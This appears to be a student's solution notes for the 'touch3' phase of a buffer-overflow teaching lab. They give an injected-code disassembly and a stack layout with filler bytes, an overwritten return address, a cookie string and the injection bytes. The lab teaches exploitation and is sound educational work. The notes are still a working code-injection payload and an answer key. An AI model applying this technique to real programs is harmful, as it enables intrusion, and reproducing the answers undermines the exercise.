
touch3.o:     file format pe-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 b0 dc 61 55 	mov    $0x5561dcb0,%rdi
   7:	c3                   	retq   
   8:	90                   	nop
   9:	90                   	nop
   a:	90                   	nop
   b:	90                   	nop
   c:	90                   	nop
   d:	90                   	nop
   e:	90                   	nop
   f:	90                   	nop
   


0x5561dc78: 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 
0x5561dca0: 0x000000005561dcb9  // jump to injection code  逆序
0x5561dca8: 0x00000000004018fa  // jump to touch3  逆序
0x5561dcb0: 35 39 62 39 39 37 66 61 00  // cookie string
0x5561dcb9: 48 c7 c7 b0 dc 61 55 c3  //  injection code
